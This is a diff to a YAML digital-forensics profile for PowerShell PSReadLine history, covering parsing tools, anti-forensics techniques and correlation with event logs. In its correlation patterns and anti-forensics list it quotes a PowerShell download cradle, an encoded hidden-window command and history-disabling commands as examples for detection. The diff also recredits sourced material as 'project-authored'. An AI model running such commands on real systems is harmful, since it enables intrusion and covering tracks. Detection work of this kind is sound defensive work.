@@ -52,9 +52,8 @@ version_differences:
   psreadline_module: "PSReadLine ships in-box from Windows 10 / PowerShell 5.x onward; on older systems it may be absent or installed separately, in which case no history file exists."
   powershell_7: "PowerShell 7 (pwsh) uses the same PSReadLine directory but may write a distinct host history file - glob all *_history.txt."
 
-# parsing_tools / limitations / anti_forensics / correlation_patterns sourced from
-# the operator's reference "DFIR: Advanced Incident Response and Threat Hunting
-# Training Guide" notebook (PSReadLine + PowerShell 4103/4104 corroboration material).
+# parsing_tools / limitations / anti_forensics / correlation_patterns are
+# project-authored forensic guidance (PSReadLine + PowerShell 4103/4104 corroboration).
 parsing_tools:
   - "No dedicated parser needed - it is flat UTF-8 text; read directly (e.g. Get-Content, strings, any text viewer). Read defensively for BOM / mixed encoding."
   - "KAPE - collects *_history.txt across all user profiles during triage; glob the PSReadLine directory rather than hardcoding ConsoleHost_history.txt."
@@ -70,12 +69,12 @@ limitations:
 
 anti_forensics:
   techniques:
-    - "Disabling history capture mid-session via 'Set-PSReadLineOption -HistorySaveStyle SaveNothing' or 'Remove-Module -Name PSReadLine' - halts further appends so subsequent commands are not recorded."  # DFIR reference
+    - "Disabling history capture mid-session via 'Set-PSReadLineOption -HistorySaveStyle SaveNothing' or 'Remove-Module -Name PSReadLine' - halts further appends so subsequent commands are not recorded."
     - "Deleting or truncating ConsoleHost_history.txt outright (no integrity guarantee on the file)."
     - "Selectively editing out individual incriminating lines, leaving a plausible but doctored history."
     - "Running everything non-interactively (-Command / -EncodedCommand / remoting) so nothing ever lands in PSReadLine in the first place."
   detection:
-    - "The evasion command itself is recorded BEFORE logging halts - because Set-PSReadLineOption/Remove-Module must be TYPED at the console, the disable command appears in the history as the final captured line, flagging the tamper attempt."  # DFIR reference
+    - "The evasion command itself is recorded BEFORE logging halts - because Set-PSReadLineOption/Remove-Module must be TYPED at the console, the disable command appears in the history as the final captured line, flagging the tamper attempt."
     - "Cross-check against PowerShell Operational EVTX 4104 - script-block logging is independent of PSReadLine and (for suspicious blocks) is force-logged by Windows even when script-block logging is globally disabled, so commands missing from a doctored history may still appear in 4104."
     - "Line-count vs mtime sanity check - an implausibly short history on a long-used profile, or a history whose last line predates known interactive activity, indicates truncation/editing."
     - "Compare each host's *_history.txt - a wiped ConsoleHost history while an ISE/VS Code host history is intact exposes selective cleanup."
@@ -106,11 +105,11 @@ corroboration_escalation:
 
 correlation_patterns:
   - name: "Download cradle to execution"
-    chain: "History line shows an in-memory download cradle (e.g. IEX (New-Object Net.WebClient).DownloadString('http://.../x.ps1')) -> EVTX 4104 deobfuscates and dates the executed script block -> $MFT/$UsnJrnl date any payload written to disk -> EVTX 4688 + Prefetch (POWERSHELL.EXE) confirm the process ran."  # DFIR reference
+    chain: "History line shows an in-memory download cradle (e.g. IEX (New-Object Net.WebClient).DownloadString('http://.../x.ps1')) -> EVTX 4104 deobfuscates and dates the executed script block -> $MFT/$UsnJrnl date any payload written to disk -> EVTX 4688 + Prefetch (POWERSHELL.EXE) confirm the process ran."
   - name: "Encoded-command unmasking"
-    chain: "History shows 'powershell -w Hidden -nop -noni -exec bypass -Enc <base64>' -> EVTX 4104 auto-decodes the Base64 to reveal the true script -> EVTX 4103 module logging supplies pipeline output/variables -> proves intent and actual effect of an otherwise opaque command."  # DFIR reference
+    chain: "History shows 'powershell -w Hidden -nop -noni -exec bypass -Enc <base64>' -> EVTX 4104 auto-decodes the Base64 to reveal the true script -> EVTX 4103 module logging supplies pipeline output/variables -> proves intent and actual effect of an otherwise opaque command."
   - name: "Self-incriminating evasion"
-    chain: "Final captured history line is 'Set-PSReadLineOption -HistorySaveStyle SaveNothing' or 'Remove-Module PSReadLine' -> treat as attacker cleanup -> pivot to EVTX 4104 (force-logged for suspicious blocks) for the commands run after history capture was disabled."  # DFIR reference
+    chain: "Final captured history line is 'Set-PSReadLineOption -HistorySaveStyle SaveNothing' or 'Remove-Module PSReadLine' -> treat as attacker cleanup -> pivot to EVTX 4104 (force-logged for suspicious blocks) for the commands run after history capture was disabled."
   - name: "Interactive-vs-automated triage"
     chain: "Command of interest present in PSReadLine history -> if also in 4104 with an interactive host -> typed at console; if 4104 shows -EncodedCommand from a service/task parent with NO history line -> non-interactive execution (different actor mechanism)."
 
